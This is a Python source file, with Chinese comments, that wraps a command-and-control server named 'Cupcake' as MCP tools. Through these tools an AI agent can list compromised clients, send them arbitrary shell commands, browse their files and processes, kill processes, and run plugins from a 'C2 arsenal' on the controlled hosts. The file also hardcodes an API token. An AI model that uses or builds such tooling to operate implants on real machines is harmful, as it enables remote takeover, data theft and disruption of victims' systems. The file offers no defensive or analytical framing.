import requests
import json
import time
from fastmcp import FastMCP

# 初始化 FastMCP 服务器
mcp = FastMCP("Cupcake-C2-Manager")

class CupcakeAPI:
    def __init__(self, server_url, api_token):
        self.server_url = server_url.rstrip('/')
        self.api_token = api_token
        self.headers = {
            "Authorization": f"Bearer {self.api_token}",
            "Content-Type": "application/json"
        }

# 配置信息
C2_SERVER = "http://127.0.0.1:9999" 
API_TOKEN = "V+*DJ$fsXN^wmJ(9Ss4RRLwVeBYV0oGf"
api = CupcakeAPI(C2_SERVER, API_TOKEN)

@mcp.tool()
def get_online_clients():
    """获取所有在线客户端列表 (UUID, Hostname, IP 等)"""
    try:
        resp = requests.get(f"{api.server_url}/api/clients", headers=api.headers, timeout=10)
        return resp.json() if resp.status_code == 200 else f"Error: {resp.status_code}"
    except Exception as e:
        return f"Exception: {str(e)}"

@mcp.tool()
def send_shell_command(uuid: str, cmd: str):
    """向指定 UUID 的受控端下发 Shell 指令"""
    payload = {"uuid": uuid, "cmd": cmd}
    try:
        resp = requests.post(f"{api.server_url}/api/cmd", headers=api.headers, json=payload, timeout=10)
        return resp.json() if resp.status_code == 200 else f"Error: {resp.status_code}"
    except Exception as e:
        return f"Exception: {str(e)}"

@mcp.tool()
def list_files(uuid: str, path: str = "."):
    """获取受控端指定路径的文件列表"""
    try:
        params = {"uuid": uuid, "path": path}
        resp = requests.get(f"{api.server_url}/api/files/list", headers=api.headers, params=params, timeout=10)
        return resp.json() if resp.status_code == 200 else f"Error: {resp.status_code}"
    except Exception as e:
        return f"Exception: {str(e)}"

@mcp.tool()
def list_processes(uuid: str):
    """获取受控端的进程列表"""
    try:
        params = {"uuid": uuid}
        resp = requests.get(f"{api.server_url}/api/processes/list", headers=api.headers, params=params, timeout=10)
        return resp.json() if resp.status_code == 200 else f"Error: {resp.status_code}"
    except Exception as e:
        return f"Exception: {str(e)}"

@mcp.tool()
def kill_process(uuid: str, pid: int):
    """根据 PID 终止受控端上的进程"""
    try:
        payload = {"uuid": uuid, "pid": pid}
        resp = requests.post(f"{api.server_url}/api/processes/kill", headers=api.headers, json=payload, timeout=10)
        return resp.json() if resp.status_code == 200 else f"Error: {resp.status_code}"
    except Exception as e:
        return f"Exception: {str(e)}"

@mcp.tool()
def list_plugins():
    """获取 C2 武器库中的所有可用插件列表"""
    try:
        resp = requests.get(f"{api.server_url}/api/plugins", headers=api.headers, timeout=10)
        return resp.json() if resp.status_code == 200 else f"Error: {resp.status_code}"
    except Exception as e:
        return f"Exception: {str(e)}"

@mcp.tool()
def run_plugin(uuid: str, plugin_id: str, args: str = ""):
    """在受控端执行指定的武器库插件"""
    payload = {"uuid": uuid, "plugin_id": plugin_id, "args": args}
    try:
        resp = requests.post(f"{api.server_url}/api/plugins/run", headers=api.headers, json=payload, timeout=10)
        return resp.json() if resp.status_code == 200 else f"Error: {resp.status_code}"
    except Exception as e:
        return f"Exception: {str(e)}"

if __name__ == "__main__":
    mcp.run()
